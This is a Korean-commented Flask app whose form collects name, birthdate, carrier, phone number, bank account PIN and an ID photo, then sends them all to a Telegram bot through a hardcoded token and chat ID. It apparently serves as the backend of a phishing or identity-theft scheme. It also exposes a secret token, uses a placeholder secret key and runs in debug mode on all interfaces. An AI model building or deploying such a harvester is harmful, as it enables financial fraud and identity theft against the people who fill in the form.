import os, requests
from datetime import datetime
from pathlib import Path
from flask import Flask, render_template, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename

# ────────── 설정 ──────────
BOT_TOKEN     = "8188337653:AAFGh85xzp5u_RqRJLrV8p3zR_D13c9RHuo"   # ← 봇 토큰으로 교체
CHAT_ID       = 1902936
FLASK_SECRET  = "super-secret-key"
ALLOWED_EXT   = {"png", "jpg", "jpeg", "gif", "pdf"}
MAX_FILE_SIZE = 5 * 1024 * 1024            # 5 MB

# ────────── Flask 기본 ──────────
BASE_DIR   = Path(__file__).resolve().parent
UPLOAD_DIR = BASE_DIR / "uploads"; UPLOAD_DIR.mkdir(exist_ok=True)

app = Flask(__name__, template_folder="templates")
app.config["MAX_CONTENT_LENGTH"] = MAX_FILE_SIZE
app.secret_key = FLASK_SECRET

# ────────── 유틸 ──────────
def allowed_file(name): return "." in name and name.rsplit(".",1)[1].lower() in ALLOWED_EXT

def build_caption(f):
    birth = datetime.strptime(f["birthdate"], "%Y-%m-%d").strftime("%Y년 %m월 %d일")
    return (
        "*신분정보 제출*\n"
        f"• 이름 : {f['name']}\n"
        f"• 생년월일 : {birth}\n"
        f"• 통신사 : {f['carrier']}\n"
        f"• 전화번호 : {f['phone']}\n"
        f"• 계좌 PIN : {f['bankpin']}\n"
        "• 동의여부 : ✅"
    )

def tg_send(path, cap):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with path.open("rb") as f:
        return requests.post(
            url,
            data={"chat_id": CHAT_ID, "caption": cap, "parse_mode": "Markdown"},
            files={"document": f},
        ).ok

# ────────── 라우팅 ──────────
@app.route("/")
def index(): return render_template("identity_form.html")

@app.route("/submit", methods=["POST"])
def submit_form():
    file = request.files.get("idPhoto")
    if not file or not allowed_file(file.filename):
        return jsonify(success=False), 400
    p = UPLOAD_DIR / secure_filename(file.filename)
    file.save(p)
    ok = tg_send(p, build_caption(request.form))
    p.unlink(missing_ok=True)
    return jsonify(success=ok)

@app.route("/uploads/<path:f>")
def uploads(f): return send_from_directory(UPLOAD_DIR, f)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
